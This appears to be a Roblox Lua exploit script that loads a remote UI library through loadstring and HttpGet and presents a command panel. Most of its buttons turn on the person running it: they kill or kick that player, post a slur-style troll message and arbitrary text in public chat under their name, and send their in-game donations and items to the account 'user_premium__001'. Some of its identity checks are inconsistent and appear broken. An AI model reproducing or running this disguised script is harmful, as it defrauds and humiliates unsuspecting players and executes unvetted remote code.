local user_premium__001 = game.Players.FlavorgamerYT
local player = game.Players.LocalPlayer

if game.Players.LocalPlayer.FlavorgamerYT then
    return
end

local Library = loadstring(Game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/wizard"))()

local PhantomForcesWindow = Library:NewWindow("! cmdx.")

local KillingCheats = PhantomForcesWindow:NewSection("Main")

KillingCheats:CreateButton("cmds", function()
	if game.Players.LocalPlayer == user_premium__001 then
		game:GetService("StarterGui"):SetCore("SendNotification",{
			Title = "Commands";
			Text = ".bring .troll .kill .kick .error .sit";
			Time = 10;
			Icon = "rbxassetid://3463417164";
		})
	end
end)

KillingCheats:CreateButton("sit", function()
    local character = game.Players.LocalPlayer.Character
    if character then
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            humanoid.Sit = true
        end
    end
end)

KillingCheats:CreateButton("unsit", function()
    local character = game.Players.LocalPlayer.Character
    if character then
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            humanoid.Sit = false
        end
    end
end)

KillingCheats:CreateButton("kill", function()
    if game.Players.LocalPlayer ~= user_premium__001 then
        local character = game.Players.LocalPlayer.Character
        if character then
            local humanoid = character:FindFirstChild("Humanoid")
            if humanoid then
                humanoid.Health = 0
            end
        end
    end
end)

KillingCheats:CreateButton("bring", function()
    if game.Players.LocalPlayer ~= user_premium__001 then
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(user_premium__001.Character.UpperTorso.Position)
    end
end)

KillingCheats:CreateButton("troll", function()
    if game.Players.LocalPlayer ~= user_premium__001 then
        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("im gay", "All")
    end
end)

KillingCheats:CreateButton("kick", function()
    if game.Players.LocalPlayer ~= user_premium__001 then
        game.Players.LocalPlayer:Kick("You have been kicked.")
    end
end)

KillingCheats:CreateButton("error", function()
    if game.Players.LocalPlayer ~= user_premium__001 then
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(99999, 99999, 99999)
    end
end)

KillingCheats:CreateTextbox("say", function(text)
    if game.Players.LocalPlayer ~= user_premium__001 then
        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(text, "All")
    end
end)

KillingCheats:CreateTextbox("donate", function(text)
    if game.Players.LocalPlayer.Name ~= "user_premium__001" then
        game.Players:Chat(";donate " .. text .. " user_premium__001")
    end
end)

KillingCheats:CreateTextbox("enlighten", function(text)
    if game.Players.LocalPlayer.Name ~= "user_premium__001" then
        game.Players.LocalPlayer.Backpack:FindFirstChild("The Arkenstone"):Equip()
        game.Players:Chat(";enlighten user_premium__001")
    end
end)
